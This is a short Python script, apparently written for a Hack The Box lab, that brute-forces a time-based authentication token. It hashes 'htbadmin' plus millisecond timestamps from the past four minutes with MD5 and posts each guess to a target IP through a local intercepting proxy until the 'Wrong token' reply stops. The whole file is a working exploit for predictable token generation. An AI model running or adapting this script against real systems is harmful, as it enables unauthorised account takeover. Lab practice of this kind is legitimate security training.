from hashlib import md5
import requests
from sys import exit
from time import time

url = "http://138.68.155.238:32057/question1/"
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
# to have a wide window try to bruteforce starting from 120seconds ago
now        = int(time())
start_time = now - 240
fail_text  = "Wrong token"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 1):
    # get token md5
    token_str="htbadmin"+str(int((x+0.938)*1000))

    md5_token = md5(str(token_str).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(token_str), md5_token))

    # send the request
    res = requests.post(url,proxies=proxies, data=data, allow_redirects=False)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
